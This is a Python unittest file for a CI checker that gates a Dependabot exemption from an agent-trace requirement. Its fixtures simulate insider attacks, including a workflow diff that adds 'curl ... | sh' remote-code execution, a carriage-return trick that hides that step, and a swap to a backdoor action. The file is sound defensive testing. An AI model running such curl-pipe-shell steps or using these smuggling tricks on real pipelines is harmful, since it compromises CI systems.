#!/usr/bin/env python3
"""Blackbox tests for check-agent-trace-requirement.py's dependency-bump exemption.

Runnable standalone: `python3 scripts/ci/tests/test_check_agent_trace_requirement.py`
(no pytest dependency; the repo has no existing Python test framework to match).
Invokes the checker as a subprocess against a temp copy of the real policy/trace
files so the test exercises the exact CLI contract the Agent Behavior workflow
uses, not internals that could drift from it.

Threat model covered by most of the "fails" cases below: a write-access insider
pushing extra commits/diffs onto an otherwise-legitimate Dependabot branch/PR --
including one who can make `.author.login`/`.committer.login` say "dependabot[bot]"
/"web-flow" by spoofing git author/committer email, since those fields are just
email-to-account matching, not cryptographic proof. GitHub's own
`commit.verification.{verified,reason}` is the part that can't be spoofed that way.
"""
import json
import shutil
import subprocess
import sys
import tempfile
import unittest
from pathlib import Path

REPO_ROOT = Path(__file__).resolve().parents[3]
SCRIPT = REPO_ROOT / "scripts" / "ci" / "check-agent-trace-requirement.py"
POLICY = REPO_ROOT / ".agents" / "evals" / "risk-policy.json"
STANDING_TRACE = REPO_ROOT / ".agents" / "evals" / "traces" / "dependency-bump.json"


def commit_record(sha="d4fbb17d00000000000000000000000000000000", author_login="dependabot[bot]",
                   committer_login="web-flow", verified=True, reason="valid"):
    return json.dumps({
        "sha": sha, "author_login": author_login, "committer_login": committer_login,
        "verified": verified, "reason": reason,
    })


# Shaped like the real `gh api repos/dasomel/narwhal/pulls/210/commits` response for PR #210's
# single ruby/setup-ruby bump commit: author dependabot[bot], committer web-flow, GitHub-verified.
REALISTIC_DEPENDABOT_COMMITS = commit_record() + "\n"

UPGRADE_DIFF = """diff --git a/.github/workflows/lint.yml b/.github/workflows/lint.yml
index 1111111..2222222 100644
--- a/.github/workflows/lint.yml
+++ b/.github/workflows/lint.yml
@@ -10,7 +10,7 @@ jobs:
     runs-on: ubuntu-latest
     steps:
-      - uses: ruby/setup-ruby@aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa # v1.321.0
+      - uses: ruby/setup-ruby@bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb # v1.324.0
"""

NON_PIN_DIFF = """diff --git a/.github/workflows/lint.yml b/.github/workflows/lint.yml
index 1111111..2222222 100644
--- a/.github/workflows/lint.yml
+++ b/.github/workflows/lint.yml
@@ -10,8 +10,8 @@ jobs:
     runs-on: ubuntu-latest
     steps:
-      - uses: ruby/setup-ruby@aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa # v1.321.0
+      - uses: ruby/setup-ruby@bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb # v1.324.0
+      - run: curl https://example.com/install.sh | sh
"""

# A `\r` embedded mid-line: reading via a newline-translating API would silently split this
# into two lines, one of which looks like a clean `uses:` pin and hides the `run:` step from
# a per-line scanner. The checker reads raw bytes (no translation) so it sees one line
# containing a literal \r and rejects it outright.
CR_INJECTION_DIFF = (
    "diff --git a/.github/workflows/lint.yml b/.github/workflows/lint.yml\n"
    "index 1111111..2222222 100644\n"
    "--- a/.github/workflows/lint.yml\n"
    "+++ b/.github/workflows/lint.yml\n"
    "@@ -10,7 +10,8 @@ jobs:\n"
    "     runs-on: ubuntu-latest\n"
    "     steps:\n"
    "-      - uses: ruby/setup-ruby@aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa # v1.321.0\n"
    "+      - uses: ruby/setup-ruby@bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb # v1.324.0\r"
    "      - run: curl https://example.com/install.sh | sh\n"
)

BINARY_DIFF = """diff --git a/.github/workflows/lint.yml b/.github/workflows/lint.yml
index 1111111..2222222 100644
Binary files a/.github/workflows/lint.yml and b/.github/workflows/lint.yml differ
"""

RENAME_DIFF = """diff --git a/.github/workflows/lint.yml b/.github/workflows/lint2.yml
similarity index 100%
rename from .github/workflows/lint.yml
rename to .github/workflows/lint2.yml
"""

UNPAIRED_ADD_DIFF = """diff --git a/.github/workflows/lint.yml b/.github/workflows/lint.yml
index 1111111..2222222 100644
--- a/.github/workflows/lint.yml
+++ b/.github/workflows/lint.yml
@@ -10,6 +10,8 @@ jobs:
     runs-on: ubuntu-latest
     steps:
-      - uses: ruby/setup-ruby@aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa # v1.321.0
+      - uses: ruby/setup-ruby@bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb # v1.324.0
+      - uses: some/other-action@cccccccccccccccccccccccccccccccccccccccc # v1.0.0
"""

ACTION_SWAP_DIFF = """diff --git a/.github/workflows/lint.yml b/.github/workflows/lint.yml
index 1111111..2222222 100644
--- a/.github/workflows/lint.yml
+++ b/.github/workflows/lint.yml
@@ -10,7 +10,7 @@ jobs:
     runs-on: ubuntu-latest
     steps:
-      - uses: ruby/setup-ruby@aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa # v1.321.0
+      - uses: evil/backdoor-action@bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb # v1.324.0
"""

NON_SHA_DIFF = """diff --git a/.github/workflows/lint.yml b/.github/workflows/lint.yml
index 1111111..2222222 100644
--- a/.github/workflows/lint.yml
+++ b/.github/workflows/lint.yml
@@ -10,7 +10,7 @@ jobs:
     runs-on: ubuntu-latest
     steps:
-      - uses: ruby/setup-ruby@aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa # v1.321.0
+      - uses: ruby/setup-ruby@v1.324.0
"""

# Same owner/repo/SHA change as UPGRADE_DIFF, but the added line's indentation (list-marker
# prefix) differs from the removed line's -- e.g. a step got reformatted/reflowed along with
# the bump. Pairing must key on prefix too, not just owner/repo, or a step could be moved to a
# different position/nesting while "reusing" an unrelated bump to look pin-only.
INDENTATION_CHANGE_DIFF = """diff --git a/.github/workflows/lint.yml b/.github/workflows/lint.yml
index 1111111..2222222 100644
--- a/.github/workflows/lint.yml
+++ b/.github/workflows/lint.yml
@@ -10,7 +10,7 @@ jobs:
     runs-on: ubuntu-latest
     steps:
-      - uses: ruby/setup-ruby@aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa # v1.321.0
+  uses: ruby/setup-ruby@bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb # v1.324.0
"""


class RunResult(unittest.TestCase):
    def setUp(self):
        self.tmp = Path(tempfile.mkdtemp(prefix="trace-req-test-"))
        self.addCleanup(shutil.rmtree, self.tmp, ignore_errors=True)
        # Real policy + a real standing trace copied alongside it, so the
        # exemption's `Path(standingTrace).exists()` check resolves relative
        # to the process cwd exactly like it does in CI.
        (self.tmp / ".agents" / "evals" / "traces").mkdir(parents=True)
        shutil.copy(POLICY, self.tmp / ".agents" / "evals" / "risk-policy.json")
        shutil.copy(STANDING_TRACE, self.tmp / ".agents" / "evals" / "traces" / "dependency-bump.json")

    def run_checker(self, changed_files, pr_author=None, workflow_diff=None, commits=None, expected_commit_count=None):
        changed_path = self.tmp / "changed.txt"
        changed_path.write_text("\n".join(changed_files) + "\n")
        cmd = [
            sys.executable, str(SCRIPT),
            "--policy", ".agents/evals/risk-policy.json",
            "--changed-files", str(changed_path),
        ]
        if pr_author is not None:
            cmd += ["--pr-author", pr_author]
        if workflow_diff is not None:
            diff_path = self.tmp / "workflow.diff"
            diff_path.write_bytes(workflow_diff.encode("utf-8"))
            cmd += ["--workflow-diff", str(diff_path)]
        if commits is not None:
            commits_path = self.tmp / "commits.jsonl"
            commits_path.write_text(commits)
            cmd += ["--commits", str(commits_path)]
        if expected_commit_count is not None:
            cmd += ["--expected-commit-count", str(expected_commit_count)]
        proc = subprocess.run(cmd, cwd=self.tmp, capture_output=True, text=True)
        try:
            report = json.loads(proc.stdout)
        except json.JSONDecodeError:
            report = None
        return proc.returncode, report, proc.stderr

    def assert_exempt(self, changed, workflow_diff=UPGRADE_DIFF, commits=REALISTIC_DEPENDABOT_COMMITS, expected_commit_count=1):
        rc, report, stderr = self.run_checker(
            changed, pr_author="dependabot[bot]", workflow_diff=workflow_diff,
            commits=commits, expected_commit_count=expected_commit_count,
        )
        self.assertEqual(rc, 0, f"expected exempt/pass, got rc={rc} stderr={stderr} report={report}")
        self.assertTrue(report["traceExempt"], report)
        return report

    def assert_not_exempt(self, changed, workflow_diff=UPGRADE_DIFF, commits=REALISTIC_DEPENDABOT_COMMITS,
                           expected_commit_count=1, pr_author="dependabot[bot]"):
        rc, report, stderr = self.run_checker(
            changed, pr_author=pr_author, workflow_diff=workflow_diff,
            commits=commits, expected_commit_count=expected_commit_count,
        )
        self.assertEqual(rc, 1, f"expected a failure, got rc={rc} stderr={stderr} report={report}")
        self.assertFalse(report["traceExempt"], report)
        return report

    # --- baseline behaviors -----------------------------------------------------------

    def test_dependabot_uses_only_bump_passes(self):
        # This is the realistic shape: author dependabot[bot], committer web-flow,
        # GitHub-verified -- exactly what `gh api .../pulls/210/commits` returns for the
        # real PR #210 this exemption exists to unblock.
        report = self.assert_exempt([".github/workflows/lint.yml"])
        self.assertTrue(report["traceRequired"])
        self.assertFalse(report["traceChanged"])

    def test_dependabot_bump_with_run_line_edit_fails(self):
        report = self.assert_not_exempt([".github/workflows/lint.yml"], workflow_diff=NON_PIN_DIFF)
        self.assertIn("non-`uses:`", report["traceExemptionDetail"])

    def test_dependabot_bump_missing_workflow_diff_fails_closed(self):
        rc, report, stderr = self.run_checker(
            [".github/workflows/lint.yml"], pr_author="dependabot[bot]",
            workflow_diff=None, commits=REALISTIC_DEPENDABOT_COMMITS, expected_commit_count=1,
        )
        self.assertEqual(rc, 1)
        self.assertFalse(report["traceExempt"])

    def test_dependabot_touching_disallowed_file_fails(self):
        report = self.assert_not_exempt([".github/workflows/lint.yml", "scripts/ci/check-mutable-inputs.py"])
        self.assertIn("outside dependency-bump allowlist", report["traceExemptionDetail"])

    def test_human_workflow_edit_without_trace_fails(self):
        report = self.assert_not_exempt(
            [".github/workflows/lint.yml"], workflow_diff=NON_PIN_DIFF, pr_author="a-human-contributor",
            commits=commit_record(author_login="a-human-contributor", committer_login="a-human-contributor",
                                   verified=False, reason="unsigned") + "\n",
        )
        self.assertNotIn("uses:", report.get("traceExemptionDetail") or "")  # rejected before ever reaching diff parsing

    def test_human_with_trace_passes(self):
        rc, report, stderr = self.run_checker(
            [".github/workflows/lint.yml", ".agents/evals/traces/2026-09-human-change.json"],
            pr_author="a-human-contributor",
        )
        self.assertEqual(rc, 0, stderr)
        self.assertTrue(report["traceChanged"])
        self.assertFalse(report["traceExempt"])

    def test_low_risk_change_never_needs_a_trace_or_exemption(self):
        rc, report, stderr = self.run_checker(["README.md"], pr_author="dependabot[bot]")
        self.assertEqual(rc, 0, stderr)
        self.assertFalse(report["traceRequired"])

    # --- diff-shape smuggling -----------------------------------------------------------

    def test_cr_injection_is_rejected(self):
        report = self.assert_not_exempt([".github/workflows/lint.yml"], workflow_diff=CR_INJECTION_DIFF)
        self.assertIn("line-break character", report["traceExemptionDetail"])

    def test_empty_diff_fails_closed(self):
        report = self.assert_not_exempt([".github/workflows/lint.yml"], workflow_diff="")
        self.assertIn("no parseable diff hunk", report["traceExemptionDetail"])

    def test_binary_diff_is_rejected(self):
        report = self.assert_not_exempt([".github/workflows/lint.yml"], workflow_diff=BINARY_DIFF)
        self.assertIn("disallowed diff marker", report["traceExemptionDetail"])

    def test_rename_diff_is_rejected(self):
        report = self.assert_not_exempt([".github/workflows/lint2.yml"], workflow_diff=RENAME_DIFF)
        self.assertTrue(
            "disallowed diff marker" in report["traceExemptionDetail"]
            or "no parseable diff hunk" in report["traceExemptionDetail"],
            report,
        )

    def test_unpaired_uses_add_is_rejected(self):
        report = self.assert_not_exempt([".github/workflows/lint.yml"], workflow_diff=UNPAIRED_ADD_DIFF)
        self.assertIn("unpaired uses:", report["traceExemptionDetail"])

    def test_action_swap_same_line_different_action_is_rejected(self):
        report = self.assert_not_exempt([".github/workflows/lint.yml"], workflow_diff=ACTION_SWAP_DIFF)
        self.assertIn("unpaired uses:", report["traceExemptionDetail"])

    def test_non_sha_new_ref_is_rejected(self):
        report = self.assert_not_exempt([".github/workflows/lint.yml"], workflow_diff=NON_SHA_DIFF)
        self.assertIn("not a 40-character commit SHA", report["traceExemptionDetail"])

    def test_indentation_change_is_rejected(self):
        # Same owner/repo/SHA-change shape as the passing case, but the added line's
        # indentation prefix differs -- pairing must key on prefix too, not owner/repo alone.
        report = self.assert_not_exempt([".github/workflows/lint.yml"], workflow_diff=INDENTATION_CHANGE_DIFF)
        self.assertIn("unpaired uses:", report["traceExemptionDetail"])
        self.assertIn("identical indentation", report["traceExemptionDetail"])

    # --- commit provenance (insider threat model) ---------------------------------------

    def test_realistic_webflow_verified_commit_passes(self):
        # Exact shape of `gh api repos/dasomel/narwhal/pulls/210/commits`: author
        # dependabot[bot], committer web-flow, verified=true, reason=valid.
        self.assert_exempt([".github/workflows/lint.yml"], commits=REALISTIC_DEPENDABOT_COMMITS, expected_commit_count=1)

    def test_unverified_commit_is_rejected(self):
        report = self.assert_not_exempt(
            [".github/workflows/lint.yml"],
            commits=commit_record(verified=False, reason="unsigned") + "\n",
        )
        self.assertIn("not GitHub-verified", report["traceExemptionDetail"])

    def test_spoofed_unsigned_dependabot_login_commit_is_rejected(self):
        # An insider crafts a commit with author/committer email set to match
        # dependabot[bot]/web-flow's known noreply addresses, so GitHub's email-to-account
        # matching produces the same logins -- but the commit was never actually signed by
        # GitHub, so verification fails. Login match alone must not be sufficient.
        report = self.assert_not_exempt(
            [".github/workflows/lint.yml"],
            commits=commit_record(author_login="dependabot[bot]", committer_login="web-flow",
                                   verified=False, reason="unsigned") + "\n",
        )
        self.assertIn("not GitHub-verified", report["traceExemptionDetail"])

    def test_commit_count_mismatch_fails_closed(self):
        # The pulls/commits API caps at 250 results even with --paginate; if the PR reports
        # more commits than were actually fetched, some commits were never checked.
        report = self.assert_not_exempt(
            [".github/workflows/lint.yml"], commits=REALISTIC_DEPENDABOT_COMMITS, expected_commit_count=2,
        )
        self.assertIn("does not match the PR's reported commit count", report["traceExemptionDetail"])

    def test_missing_commits_fails_closed(self):
        rc, report, stderr = self.run_checker(
            [".github/workflows/lint.yml"], pr_author="dependabot[bot]",
            workflow_diff=UPGRADE_DIFF, commits=None, expected_commit_count=1,
        )
        self.assertEqual(rc, 1)
        self.assertFalse(report["traceExempt"])
        self.assertIn("commit record list unavailable", report["traceExemptionDetail"])

    def test_missing_expected_commit_count_fails_closed(self):
        rc, report, stderr = self.run_checker(
            [".github/workflows/lint.yml"], pr_author="dependabot[bot]",
            workflow_diff=UPGRADE_DIFF, commits=REALISTIC_DEPENDABOT_COMMITS, expected_commit_count=None,
        )
        self.assertEqual(rc, 1)
        self.assertFalse(report["traceExempt"])
        self.assertIn("expected PR commit count not provided", report["traceExemptionDetail"])


if __name__ == "__main__":
    unittest.main()
